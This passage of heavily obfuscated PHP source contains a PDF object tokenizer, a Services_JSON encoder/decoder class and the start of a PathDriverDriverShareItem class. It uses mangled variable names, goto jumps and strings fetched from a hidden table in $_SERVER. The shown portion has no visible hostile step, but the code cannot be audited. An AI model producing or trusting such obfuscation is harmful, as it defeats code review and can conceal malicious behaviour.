$f­ù”Ì„¾…); } break; case $A¡ôÄ–©Ó¡[8]: $FšÎÄÖ‘ºË = $dÔÜŞº‘Èİ; ++$f­ù”Ì„¾…; $e„Œ‡ôˆ‰à = preg_match($A¡ôÄ–©Ó¡[1596], substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, 256), $b›‘¿‡†‚); if (1 == $e„Œ‡ôˆ‰à) { $a¾Ã†™Ü” = $b›‘¿‡†‚[1]; $f­ù”Ì„¾… += strlen($a¾Ã†™Ü”); } break; case $A¡ôÄ–©Ó¡[248]: case $A¡ôÄ–©Ó¡[817]: $FšÎÄÖ‘ºË = $dÔÜŞº‘Èİ; ++$f­ù”Ì„¾…; $dØåƒ¡ŠëÜ = $f­ù”Ì„¾…; if ($A¡ôÄ–©Ó¡[248] == $dÔÜŞº‘Èİ) { $E¼á¹¥Ÿ‚„ = 1; while ($E¼á¹¥Ÿ‚„ > 0) { if (!isset($e„Û©àÕÁ™[$dØåƒ¡ŠëÜ])) { break; } $dšÕÅƒŞ ‘ = $e„Û©àÕÁ™[$dØåƒ¡ŠëÜ]; switch ($dšÕÅƒŞ ‘) { case $A¡ôÄ–©Ó¡[93]: ++$dØåƒ¡ŠëÜ; break; case $A¡ôÄ–©Ó¡[248]: ++$E¼á¹¥Ÿ‚„; break; case $A¡ôÄ–©Ó¡[817]: --$E¼á¹¥Ÿ‚„; break; } ++$dØåƒ¡ŠëÜ; } $a¾Ã†™Ü” = substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, $dØåƒ¡ŠëÜ - $f­ù”Ì„¾… - 1); $f­ù”Ì„¾… = $dØåƒ¡ŠëÜ; } break; case $A¡ôÄ–©Ó¡[157]: case $A¡ôÄ–©Ó¡[476]: $FšÎÄÖ‘ºË = $dÔÜŞº‘Èİ; ++$f­ù”Ì„¾…; if ($A¡ôÄ–©Ó¡[157] == $dÔÜŞº‘Èİ) { $a¾Ã†™Ü” = array(); do { $FÕÂß×Øë = $f­ù”Ì„¾…; $A ä¯…‹©É = self::getRawObject($e„Û©àÕÁ™, $f­ù”Ì„¾…); $f­ù”Ì„¾… = $A ä¯…‹©É[2]; $a¾Ã†™Ü”[] = $A ä¯…‹©É; } while ($A¡ôÄ–©Ó¡[476] != $A ä¯…‹©É[0] && $f­ù”Ì„¾… != $FÕÂß×Øë); array_pop($a¾Ã†™Ü”); } break; case $A¡ôÄ–©Ó¡[926]: case $A¡ôÄ–©Ó¡[929]: if (isset($e„Û©àÕÁ™[$f­ù”Ì„¾… + 1]) && $e„Û©àÕÁ™[$f­ù”Ì„¾… + 1] == $dÔÜŞº‘Èİ) { $FšÎÄÖ‘ºË = $dÔÜŞº‘Èİ . $dÔÜŞº‘Èİ; $f­ù”Ì„¾… += 2; if ($A¡ôÄ–©Ó¡[926] == $dÔÜŞº‘Èİ) { $a¾Ã†™Ü” = array(); do { $FÕÂß×Øë = $f­ù”Ì„¾…; $A ä¯…‹©É = self::getRawObject($e„Û©àÕÁ™, $f­ù”Ì„¾…); $f­ù”Ì„¾… = $A ä¯…‹©É[2]; $a¾Ã†™Ü”[] = $A ä¯…‹©É; } while ($A¡ôÄ–©Ó¡[1597] != $A ä¯…‹©É[0] && $f­ù”Ì„¾… != $FÕÂß×Øë); array_pop($a¾Ã†™Ü”); } } else { $FšÎÄÖ‘ºË = $dÔÜŞº‘Èİ; ++$f­ù”Ì„¾…; $e„Œ‡ôˆ‰à = preg_match($A¡ôÄ–©Ó¡[1598], substr($e„Û©àÕÁ™, $f­ù”Ì„¾…), $b›‘¿‡†‚); if ($A¡ôÄ–©Ó¡[926] == $dÔÜŞº‘Èİ && 1 == $e„Œ‡ôˆ‰à) { $a¾Ã†™Ü” = strtr($b›‘¿‡†‚[1], $A¡ôÄ–©Ó¡[1599], $A¡ôÄ–©Ó¡[33]); $f­ù”Ì„¾… += \strlen($b›‘¿‡†‚[0]); } elseif (!1 !== ($fÃõ‹·¿ê  = strpos($e„Û©àÕÁ™, $A¡ôÄ–©Ó¡[929], $f­ù”Ì„¾…))) { $f­ù”Ì„¾… = $fÃõ‹·¿ê  + 1; } } break; default: if ($A¡ôÄ–©Ó¡[1600] == substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, 6)) { $FšÎÄÖ‘ºË = $A¡ôÄ–©Ó¡[1600]; $f­ù”Ì„¾… += 6; } elseif ($A¡ôÄ–©Ó¡[99] == substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, 4)) { $FšÎÄÖ‘ºË = $A¡ôÄ–©Ó¡[99]; $f­ù”Ì„¾… += 4; $a¾Ã†™Ü” = $A¡ôÄ–©Ó¡[99]; } elseif ($A¡ôÄ–©Ó¡[1601] == substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, 4)) { $FšÎÄÖ‘ºË = $A¡ôÄ–©Ó¡[1602]; $f­ù”Ì„¾… += 4; $a¾Ã†™Ü” = $A¡ôÄ–©Ó¡[1601]; } elseif ($A¡ôÄ–©Ó¡[1603] == substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, 5)) { $FšÎÄÖ‘ºË = $A¡ôÄ–©Ó¡[1602]; $f­ù”Ì„¾… += 5; $a¾Ã†™Ü” = $A¡ôÄ–©Ó¡[1603]; } elseif ($A¡ôÄ–©Ó¡[1604] == substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, 6)) { $FšÎÄÖ‘ºË = $A¡ôÄ–©Ó¡[1604]; $f­ù”Ì„¾… += 6; if (1 == preg_match($A¡ôÄ–©Ó¡[1605], substr($e„Û©àÕÁ™, $f­ù”Ì„¾…), $b›‘¿‡†‚)) { $f­ù”Ì„¾… += strlen($b›‘¿‡†‚[0]); $D³¹ÏÜ£§‹ = $A¡ôÄ–©Ó¡[1606]; $e„Œ‡ôˆ‰à = preg_match($D³¹ÏÜ£§‹, substr($e„Û©àÕÁ™, $f­ù”Ì„¾…), $b›‘¿‡†‚, PREG_OFFSET_CAPTURE); if (1 == $e„Œ‡ôˆ‰à) { $a¾Ã†™Ü” = substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, $b›‘¿‡†‚[0][1]); $f­ù”Ì„¾… += $b›‘¿‡†‚[1][1]; } } } elseif ($A¡ôÄ–©Ó¡[1607] == substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, 9)) { $FšÎÄÖ‘ºË = $A¡ôÄ–©Ó¡[1607]; $f­ù”Ì„¾… += 9; } elseif (1 == preg_match($A¡ôÄ–©Ó¡[1608], substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, 33), $b›‘¿‡†‚)) { $FšÎÄÖ‘ºË = $A¡ôÄ–©Ó¡[1570]; $f­ù”Ì„¾… += strlen($b›‘¿‡†‚[0]); $a¾Ã†™Ü” = intval($b›‘¿‡†‚[1]) . $A¡ôÄ–©Ó¡[70] . intval($b›‘¿‡†‚[2]); } elseif (1 == preg_match($A¡ôÄ–©Ó¡[1609], substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, 33), $b›‘¿‡†‚)) { $FšÎÄÖ‘ºË = $A¡ôÄ–©Ó¡[1610]; $a¾Ã†™Ü” = intval($b›‘¿‡†‚[1]) . $A¡ôÄ–©Ó¡[70] . intval($b›‘¿‡†‚[2]); $f­ù”Ì„¾… += strlen($b›‘¿‡†‚[0]); } elseif (($E©Î÷Ã‡ƒ = strspn($e„Û©àÕÁ™, $A¡ôÄ–©Ó¡[1611], $f­ù”Ì„¾…)) > 0) { $FšÎÄÖ‘ºË = $A¡ôÄ–©Ó¡[1612]; $a¾Ã†™Ü” = substr($e„Û©àÕÁ™, $f­ù”Ì„¾…, $E©Î÷Ã‡ƒ); $f­ù”Ì„¾… += $E©Î÷Ã‡ƒ; } break; } goto a ªÒ‰†’Ÿ; a ªÒ‰†’Ÿ: return array($FšÎÄÖ‘ºË, $a¾Ã†™Ü”, $f­ù”Ì„¾…); goto Fëöã¬áÂ×; FîÑ‰Ç«…: $A¡ôÄ–©Ó¡ =& $_SERVER[‚Ğ°–—î]; $FšÎÄÖ‘ºË = $A¡ôÄ–©Ó¡[33]; $a¾Ã†™Ü” = $A¡ôÄ–©Ó¡[33]; goto B™‚àÓÌ©; Fëöã¬áÂ×: } } goto FºâöŠÁæœ; Aââğ‹¯øõ: define($_SERVER[‚Ğ°–—î][1938], 16); define($_SERVER[‚Ğ°–—î][1939], 32); class Services_JSON { function __construct($f÷¸—ƒÙ×Ü = 0) { $this->use = $f÷¸—ƒÙ×Ü; } function utf162utf8($dÓ¡êÎ¨´Ì) { $EºÈÚ¿¯Ç¦ =& $_SERVER[‚Ğ°–—î]; if (function_exists($EºÈÚ¿¯Ç¦[68])) { return mb_convert_encoding($dÓ¡êÎ¨´Ì, $EºÈÚ¿¯Ç¦[1591], $EºÈÚ¿¯Ç¦[1940]); } $Aî×‘•¹è = ord($dÓ¡êÎ¨´Ì[0]) << 8 | ord($dÓ¡êÎ¨´Ì[1]); switch (!0) { case (127 & $Aî×‘•¹è) == $Aî×‘•¹è: return chr(127 & $Aî×‘•¹è); case (2047 & $Aî×‘•¹è) == $Aî×‘•¹è: return chr(192 | $Aî×‘•¹è >> 6 & 31) . chr(128 | $Aî×‘•¹è & 63); case (65535 & $Aî×‘•¹è) == $Aî×‘•¹è: return chr(224 | $Aî×‘•¹è >> 12 & 15) . chr(128 | $Aî×‘•¹è >> 6 & 63) . chr(128 | $Aî×‘•¹è & 63); } return $EºÈÚ¿¯Ç¦[33]; } function utf82utf16($AŒ¶»èì) { $aˆÒ“¶Ë†Ã =& $_SERVER[‚Ğ°–—î]; if (function_exists($aˆÒ“¶Ë†Ã[68])) { return mb_convert_encoding($AŒ¶»èì, $aˆÒ“¶Ë†Ã[1940], $aˆÒ“¶Ë†Ã[1591]); } switch (strlen($AŒ¶»èì)) { case 1: return $AŒ¶»èì; case 2: return chr(7 & ord($AŒ¶»èì[0]) >> 2) . chr(192 & ord($AŒ¶»èì[0]) << 6 | 63 & ord($AŒ¶»èì[1])); case 3: return chr(240 & ord($AŒ¶»èì[0]) << 4 | 15 & ord($AŒ¶»èì[1]) >> 2) . chr(192 & ord($AŒ¶»èì[1]) << 6 | 127 & ord($AŒ¶»èì[2])); } return $aˆÒ“¶Ë†Ã[33]; } function encode($f›Ï’’Òš¥) { $FÖ­ßæÛã =& $_SERVER[‚Ğ°–—î]; switch (gettype($f›Ï’’Òš¥)) { case $FÖ­ßæÛã[1602]: return $f›Ï’’Òš¥ ? $FÖ­ßæÛã[1601] : $FÖ­ßæÛã[1603]; case $FÖ­ßæÛã[1941]: return $FÖ­ßæÛã[99]; case $FÖ­ßæÛã[303]: return (int) $f›Ï’’Òš¥; case $FÖ­ßæÛã[278]: case $FÖ­ßæÛã[277]: return (double) $f›Ï’’Òš¥; case $FÖ­ßæÛã[312]: $c†Êº–¡“Ó = $FÖ­ßæÛã[33]; $Cë±è‡À¢È = strlen($f›Ï’’Òš¥); for ($aÂøå¥Ãé = 0; $aÂøå¥Ãé < $Cë±è‡À¢È; ++$aÂøå¥Ãé) { $Fæ•ô™¨ô = ord($f›Ï’’Òš¥[$aÂøå¥Ãé]); switch (!0) { case $Fæ•ô™¨ô == 8: $c†Êº–¡“Ó .= $FÖ­ßæÛã[1942]; break; case $Fæ•ô™¨ô == 9: $c†Êº–¡“Ó .= $FÖ­ßæÛã[1578]; break; case $Fæ•ô™¨ô == 10: $c†Êº–¡“Ó .= $FÖ­ßæÛã[1576]; break; case $Fæ•ô™¨ô == 12: $c†Êº–¡“Ó .= $FÖ­ßæÛã[1943]; break; case $Fæ•ô™¨ô == 13: $c†Êº–¡“Ó .= $FÖ­ßæÛã[1577]; break; case $Fæ•ô™¨ô == 34: case $Fæ•ô™¨ô == 47: case $Fæ•ô™¨ô == 92: $c†Êº–¡“Ó .= $FÖ­ßæÛã[93] . $f›Ï’’Òš¥[$aÂøå¥Ãé]; break; case $Fæ•ô™¨ô >= 32 && $Fæ•ô™¨ô <= 127: $c†Êº–¡“Ó .= $f›Ï’’Òš¥[$aÂøå¥Ãé]; break; case ($Fæ•ô™¨ô & 224) == 192: $cİ ïÌÂÜ = pack($FÖ­ßæÛã[1944], $Fæ•ô™¨ô, ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 1])); $aÂøå¥Ãé += 1; $f÷Ú•°è = $this->utf82utf16($cİ ïÌÂÜ); $c†Êº–¡“Ó .= sprintf($FÖ­ßæÛã[1945], bin2hex($f÷Ú•°è)); break; case ($Fæ•ô™¨ô & 240) == 224: $cİ ïÌÂÜ = pack($FÖ­ßæÛã[1944], $Fæ•ô™¨ô, ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 1]), ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 2])); $aÂøå¥Ãé += 2; $f÷Ú•°è = $this->utf82utf16($cİ ïÌÂÜ); $c†Êº–¡“Ó .= sprintf($FÖ­ßæÛã[1945], bin2hex($f÷Ú•°è)); break; case ($Fæ•ô™¨ô & 248) == 240: $cİ ïÌÂÜ = pack($FÖ­ßæÛã[1944], $Fæ•ô™¨ô, ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 1]), ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 2]), ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 3])); $aÂøå¥Ãé += 3; $f÷Ú•°è = $this->utf82utf16($cİ ïÌÂÜ); $c†Êº–¡“Ó .= sprintf($FÖ­ßæÛã[1945], bin2hex($f÷Ú•°è)); break; case ($Fæ•ô™¨ô & 252) == 248: $cİ ïÌÂÜ = pack($FÖ­ßæÛã[1944], $Fæ•ô™¨ô, ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 1]), ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 2]), ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 3]), ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 4])); $aÂøå¥Ãé += 4; $f÷Ú•°è = $this->utf82utf16($cİ ïÌÂÜ); $c†Êº–¡“Ó .= sprintf($FÖ­ßæÛã[1945], bin2hex($f÷Ú•°è)); break; case ($Fæ•ô™¨ô & 254) == 252: $cİ ïÌÂÜ = pack($FÖ­ßæÛã[1944], $Fæ•ô™¨ô, ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 1]), ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 2]), ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 3]), ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 4]), ord($f›Ï’’Òš¥[$aÂøå¥Ãé + 5])); $aÂøå¥Ãé += 5; $f÷Ú•°è = $this->utf82utf16($cİ ïÌÂÜ); $c†Êº–¡“Ó .= sprintf($FÖ­ßæÛã[1945], bin2hex($f÷Ú•°è)); break; } } return $FÖ­ßæÛã[113] . $c†Êº–¡“Ó . $FÖ­ßæÛã[113]; case $FÖ­ßæÛã[1946]: if (is_array($f›Ï’’Òš¥) && count($f›Ï’’Òš¥) && array_keys($f›Ï’’Òš¥) !== range(0, sizeof($f›Ï’’Òš¥) - 1)) { $EÕÛ™ä¿Ô = array_map(array($this, $FÖ­ßæÛã[1947]), array_keys($f›Ï’’Òš¥), array_values($f›Ï’’Òš¥)); foreach ($EÕÛ™ä¿Ô as $Fâñ‘ßÒÛ—) { if (Services_JSON::isError($Fâñ‘ßÒÛ—)) { return $Fâñ‘ßÒÛ—; } } return $FÖ­ßæÛã[1069] . join($FÖ­ßæÛã[47], $EÕÛ™ä¿Ô) . $FÖ­ßæÛã[315]; } $E¦Ò½…È‡¾ = array_map(array($this, $FÖ­ßæÛã[1948]), $f›Ï’’Òš¥); foreach ($E¦Ò½…È‡¾ as $cÎ‚ÇŒË¹”) { if (Services_JSON::isError($cÎ‚ÇŒË¹”)) { return $cÎ‚ÇŒË¹”; } } return $FÖ­ßæÛã[157] . join($FÖ­ßæÛã[47], $E¦Ò½…È‡¾) . $FÖ­ßæÛã[476]; case $FÖ­ßæÛã[1949]: $Fô˜î¢Ø¿¸ = get_object_vars($f›Ï’’Òš¥); $EÕÛ™ä¿Ô = array_map(array($this, $FÖ­ßæÛã[1947]), array_keys($Fô˜î¢Ø¿¸), array_values($Fô˜î¢Ø¿¸)); foreach ($EÕÛ™ä¿Ô as $Fâñ‘ßÒÛ—) { if (Services_JSON::isError($Fâñ‘ßÒÛ—)) { return $Fâñ‘ßÒÛ—; } } return $FÖ­ßæÛã[1069] . join($FÖ­ßæÛã[47], $EÕÛ™ä¿Ô) . $FÖ­ßæÛã[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $FÖ­ßæÛã[99] : new Services_JSON_Error(gettype($f›Ï’’Òš¥) . $FÖ­ßæÛã[1950]); } } function name_value($bÌî×¬–‘, $B›º½Œê÷ó) { $d˜¾øÒ¾ • = $this->encode($B›º½Œê÷ó); if (Services_JSON::isError($d˜¾øÒ¾ •)) { return $d˜¾øÒ¾ •; } return $this->encode(strval($bÌî×¬–‘)) . $_SERVER[‚Ğ°–—î][4] . $d˜¾øÒ¾ •; } function reduce_string($càæêŸŸé§) { $c§È¤îÀĞ =& $_SERVER[‚Ğ°–—î]; $càæêŸŸé§ = preg_replace(array($c§È¤îÀĞ[1951], $c§È¤îÀĞ[1952], $c§È¤îÀĞ[1953]), $c§È¤îÀĞ[33], $càæêŸŸé§); return trim($càæêŸŸé§); } function decode($Aœßëï£) { $c½§Š‹¨¿´ =& $_SERVER[‚Ğ°–—î]; $Aœßëï£ = $this->reduce_string($Aœßëï£); switch (strtolower($Aœßëï£)) { case $c½§Š‹¨¿´[1601]: return !0; case $c½§Š‹¨¿´[1603]: return !1; case $c½§Š‹¨¿´[99]: return null; default: $F‘†Ğµ—™ = array(); if (is_numeric($Aœßëï£)) { return (double) $Aœßëï£ == (int) $Aœßëï£ ? (int) $Aœßëï£ : (double) $Aœßëï£; } elseif (preg_match($c½§Š‹¨¿´[1954], $Aœßëï£, $F‘†Ğµ—™) && $F‘†Ğµ—™[1] == $F‘†Ğµ—™[2]) { $fÒ¬³“ÌÓÚ = substr($Aœßëï£, 0, 1); $Bá°‰«ï° = substr($Aœßëï£, 1, -1); $b¦ÒãÏæÂ© = $c½§Š‹¨¿´[33]; $AâÁƒÙ­Š† = strlen($Bá°‰«ï°); for ($d˜áÎ…¸Ø = 0; $d˜áÎ…¸Ø < $AâÁƒÙ­Š†; ++$d˜áÎ…¸Ø) { $DØÂ•´Úó— = substr($Bá°‰«ï°, $d˜áÎ…¸Ø, 2); $BÊÖ¾İ›˜ = ord($Bá°‰«ï°[$d˜áÎ…¸Ø]); switch (!0) { case $DØÂ•´Úó— == $c½§Š‹¨¿´[1942]: $b¦ÒãÏæÂ© .= chr(8); ++$d˜áÎ…¸Ø; break; case $DØÂ•´Úó— == $c½§Š‹¨¿´[1578]: $b¦ÒãÏæÂ© .= chr(9); ++$d˜áÎ…¸Ø; break; case $DØÂ•´Úó— == $c½§Š‹¨¿´[1576]: $b¦ÒãÏæÂ© .= chr(10); ++$d˜áÎ…¸Ø; break; case $DØÂ•´Úó— == $c½§Š‹¨¿´[1943]: $b¦ÒãÏæÂ© .= chr(12); ++$d˜áÎ…¸Ø; break; case $DØÂ•´Úó— == $c½§Š‹¨¿´[1577]: $b¦ÒãÏæÂ© .= chr(13); ++$d˜áÎ…¸Ø; break; case $DØÂ•´Úó— == $c½§Š‹¨¿´[1358]: case $DØÂ•´Úó— == $c½§Š‹¨¿´[1955]: case $DØÂ•´Úó— == $c½§Š‹¨¿´[1571]: case $DØÂ•´Úó— == $c½§Š‹¨¿´[1573]: if ($fÒ¬³“ÌÓÚ == $c½§Š‹¨¿´[113] && $DØÂ•´Úó— != $c½§Š‹¨¿´[1955] || $fÒ¬³“ÌÓÚ == $c½§Š‹¨¿´[55] && $DØÂ•´Úó— != $c½§Š‹¨¿´[1358]) { $b¦ÒãÏæÂ© .= $Bá°‰«ï°[++$d˜áÎ…¸Ø]; } break; case preg_match($c½§Š‹¨¿´[1956], substr($Bá°‰«ï°, $d˜áÎ…¸Ø, 6)): $F‡ùÏ¯ˆØ = chr(hexdec(substr($Bá°‰«ï°, $d˜áÎ…¸Ø + 2, 2))) . chr(hexdec(substr($Bá°‰«ï°, $d˜áÎ…¸Ø + 4, 2))); $b¦ÒãÏæÂ© .= $this->utf162utf8($F‡ùÏ¯ˆØ); $d˜áÎ…¸Ø += 5; break; case $BÊÖ¾İ›˜ >= 32 && $BÊÖ¾İ›˜ <= 127: $b¦ÒãÏæÂ© .= $Bá°‰«ï°[$d˜áÎ…¸Ø]; break; case ($BÊÖ¾İ›˜ & 224) == 192: $b¦ÒãÏæÂ© .= substr($Bá°‰«ï°, $d˜áÎ…¸Ø, 2); ++$d˜áÎ…¸Ø; break; case ($BÊÖ¾İ›˜ & 240) == 224: $b¦ÒãÏæÂ© .= substr($Bá°‰«ï°, $d˜áÎ…¸Ø, 3); $d˜áÎ…¸Ø += 2; break; case ($BÊÖ¾İ›˜ & 248) == 240: $b¦ÒãÏæÂ© .= substr($Bá°‰«ï°, $d˜áÎ…¸Ø, 4); $d˜áÎ…¸Ø += 3; break; case ($BÊÖ¾İ›˜ & 252) == 248: $b¦ÒãÏæÂ© .= substr($Bá°‰«ï°, $d˜áÎ…¸Ø, 5); $d˜áÎ…¸Ø += 4; break; case ($BÊÖ¾İ›˜ & 254) == 252: $b¦ÒãÏæÂ© .= substr($Bá°‰«ï°, $d˜áÎ…¸Ø, 6); $d˜áÎ…¸Ø += 5; break; } } return $b¦ÒãÏæÂ©; } elseif (preg_match($c½§Š‹¨¿´[1957], $Aœßëï£) || preg_match($c½§Š‹¨¿´[1958], $Aœßëï£)) { goto fÙğõâ¹; e‘ÑÀõÄ™: $Bá°‰«ï° = $this->reduce_string($Bá°‰«ï°); if ($Bá°‰«ï° == $c½§Š‹¨¿´[33]) { if (reset($BÜ“Ú°µ¤Õ) == SERVICES_JSON_IN_ARR) { return $BšÛ÷İï±; } else { return $eÃ–ö·˜ÕÕ; } } $AâÁƒÙ­Š† = strlen($Bá°‰«ï°); goto Cƒãç±ŸøĞ; Cƒãç±ŸøĞ: for ($d˜áÎ…¸Ø = 0; $d˜áÎ…¸Ø <= $AâÁƒÙ­Š†; ++$d˜áÎ…¸Ø) { $bùğñˆ©ÇÚ = end($BÜ“Ú°µ¤Õ); $DØÂ•´Úó— = substr($Bá°‰«ï°, $d˜áÎ…¸Ø, 2); if ($d˜áÎ…¸Ø == $AâÁƒÙ­Š† || $Bá°‰«ï°[$d˜áÎ…¸Ø] == $c½§Š‹¨¿´[47] && $bùğñˆ©ÇÚ[$c½§Š‹¨¿´[1959]] == SERVICES_JSON_SLICE) { $cá¯ˆ°†Şİ = substr($Bá°‰«ï°, $bùğñˆ©ÇÚ[$c½§Š‹¨¿´[263]], $d˜áÎ…¸Ø - $bùğñˆ©ÇÚ[$c½§Š‹¨¿´[263]]); array_push($BÜ“Ú°µ¤Õ, array($c½§Š‹¨¿´[1959] => SERVICES_JSON_SLICE, $c½§Š‹¨¿´[263] => $d˜áÎ…¸Ø + 1, $c½§Š‹¨¿´[1960] => !1)); if (reset($BÜ“Ú°µ¤Õ) == SERVICES_JSON_IN_ARR) { array_push($BšÛ÷İï±, $this->decode($cá¯ˆ°†Şİ)); } elseif (reset($BÜ“Ú°µ¤Õ) == SERVICES_JSON_IN_OBJ) { $B±í“Çİ®Â = array(); if (preg_match($c½§Š‹¨¿´[1961], $cá¯ˆ°†Şİ, $B±í“Çİ®Â)) { $fâÁ‰ŞÆ—› = $this->decode($B±í“Çİ®Â[1]); $f¢¥í‡ğƒÔ = $this->decode($B±í“Çİ®Â[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eÃ–ö·˜ÕÕ[$fâÁ‰ŞÆ—›] = $f¢¥í‡ğƒÔ; } else { $eÃ–ö·˜ÕÕ->{$fâÁ‰ŞÆ—›} = $f¢¥í‡ğƒÔ; } } elseif (preg_match($c½§Š‹¨¿´[1962], $cá¯ˆ°†Şİ, $B±í“Çİ®Â)) { $fâÁ‰ŞÆ—› = $B±í“Çİ®Â[1]; $f¢¥í‡ğƒÔ = $this->decode($B±í“Çİ®Â[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eÃ–ö·˜ÕÕ[$fâÁ‰ŞÆ—›] = $f¢¥í‡ğƒÔ; } else { $eÃ–ö·˜ÕÕ->{$fâÁ‰ŞÆ—›} = $f¢¥í‡ğƒÔ; } } } } elseif (($Bá°‰«ï°[$d˜áÎ…¸Ø] == $c½§Š‹¨¿´[113] || $Bá°‰«ï°[$d˜áÎ…¸Ø] == $c½§Š‹¨¿´[55]) && $bùğñˆ©ÇÚ[$c½§Š‹¨¿´[1959]] != SERVICES_JSON_IN_STR) { array_push($BÜ“Ú°µ¤Õ, array($c½§Š‹¨¿´[1959] => SERVICES_JSON_IN_STR, $c½§Š‹¨¿´[263] => $d˜áÎ…¸Ø, $c½§Š‹¨¿´[1960] => $Bá°‰«ï°[$d˜áÎ…¸Ø])); } elseif ($Bá°‰«ï°[$d˜áÎ…¸Ø] == $bùğñˆ©ÇÚ[$c½§Š‹¨¿´[1960]] && $bùğñˆ©ÇÚ[$c½§Š‹¨¿´[1959]] == SERVICES_JSON_IN_STR && (strlen(substr($Bá°‰«ï°, 0, $d˜áÎ…¸Ø)) - strlen(rtrim(substr($Bá°‰«ï°, 0, $d˜áÎ…¸Ø), $c½§Š‹¨¿´[93]))) % 2 != 1) { array_pop($BÜ“Ú°µ¤Õ); } elseif ($Bá°‰«ï°[$d˜áÎ…¸Ø] == $c½§Š‹¨¿´[157] && in_array($bùğñˆ©ÇÚ[$c½§Š‹¨¿´[1959]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($BÜ“Ú°µ¤Õ, array($c½§Š‹¨¿´[1959] => SERVICES_JSON_IN_ARR, $c½§Š‹¨¿´[263] => $d˜áÎ…¸Ø, $c½§Š‹¨¿´[1960] => !1)); } elseif ($Bá°‰«ï°[$d˜áÎ…¸Ø] == $c½§Š‹¨¿´[476] && $bùğñˆ©ÇÚ[$c½§Š‹¨¿´[1959]] == SERVICES_JSON_IN_ARR) { array_pop($BÜ“Ú°µ¤Õ); } elseif ($Bá°‰«ï°[$d˜áÎ…¸Ø] == $c½§Š‹¨¿´[1069] && in_array($bùğñˆ©ÇÚ[$c½§Š‹¨¿´[1959]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($BÜ“Ú°µ¤Õ, array($c½§Š‹¨¿´[1959] => SERVICES_JSON_IN_OBJ, $c½§Š‹¨¿´[263] => $d˜áÎ…¸Ø, $c½§Š‹¨¿´[1960] => !1)); } elseif ($Bá°‰«ï°[$d˜áÎ…¸Ø] == $c½§Š‹¨¿´[315] && $bùğñˆ©ÇÚ[$c½§Š‹¨¿´[1959]] == SERVICES_JSON_IN_OBJ) { array_pop($BÜ“Ú°µ¤Õ); } elseif ($DØÂ•´Úó— == $c½§Š‹¨¿´[1963] && in_array($bùğñˆ©ÇÚ[$c½§Š‹¨¿´[1959]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($BÜ“Ú°µ¤Õ, array($c½§Š‹¨¿´[1959] => SERVICES_JSON_IN_CMT, $c½§Š‹¨¿´[263] => $d˜áÎ…¸Ø, $c½§Š‹¨¿´[1960] => !1)); $d˜áÎ…¸Ø++; } elseif ($DØÂ•´Úó— == $c½§Š‹¨¿´[1964] && $bùğñˆ©ÇÚ[$c½§Š‹¨¿´[1959]] == SERVICES_JSON_IN_CMT) { array_pop($BÜ“Ú°µ¤Õ); $d˜áÎ…¸Ø++; for ($ağï­ÕÁË = $bùğñˆ©ÇÚ[$c½§Š‹¨¿´[263]]; $ağï­ÕÁË <= $d˜áÎ…¸Ø; ++$ağï­ÕÁË) { $Bá°‰«ï° = substr_replace($Bá°‰«ï°, $c½§Š‹¨¿´[50], $ağï­ÕÁË, 1); } } } if (reset($BÜ“Ú°µ¤Õ) == SERVICES_JSON_IN_ARR) { return $BšÛ÷İï±; } elseif (reset($BÜ“Ú°µ¤Õ) == SERVICES_JSON_IN_OBJ) { return $eÃ–ö·˜ÕÕ; } goto FÍãˆ­››ñ; fÙğõâ¹: if ($Aœßëï£[0] == $c½§Š‹¨¿´[157]) { $BÜ“Ú°µ¤Õ = array(SERVICES_JSON_IN_ARR); $BšÛ÷İï± = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $BÜ“Ú°µ¤Õ = array(SERVICES_JSON_IN_OBJ); $eÃ–ö·˜ÕÕ = array(); } else { $BÜ“Ú°µ¤Õ = array(SERVICES_JSON_IN_OBJ); $eÃ–ö·˜ÕÕ = new stdClass(); } } array_push($BÜ“Ú°µ¤Õ, array($c½§Š‹¨¿´[1959] => SERVICES_JSON_SLICE, $c½§Š‹¨¿´[263] => 0, $c½§Š‹¨¿´[1960] => !1)); $Bá°‰«ï° = substr($Aœßëï£, 1, -1); goto e‘ÑÀõÄ™; FÍãˆ­››ñ: } } } function isError($AÜ–¦éÉÛ´, $d»ÀÍ†ù = null) { $Då„†Åê”Ï =& $_SERVER[‚Ğ°–—î]; if (class_exists($Då„†Åê”Ï[1965])) { return PEAR::isError($AÜ–¦éÉÛ´, $d»ÀÍ†ù); } elseif (is_object($AÜ–¦éÉÛ´) && (get_class($AÜ–¦éÉÛ´) == $Då„†Åê”Ï[1966] || is_subclass_of($AÜ–¦éÉÛ´, $Då„†Åê”Ï[1966]))) { return !0; } return !1; } } goto e“Ç±Ô‘âá; E™­ŸÉÎ“”: class PathDriverDriverShareItem { public function __construct($b‹²ÔÎ—¡Ò) { 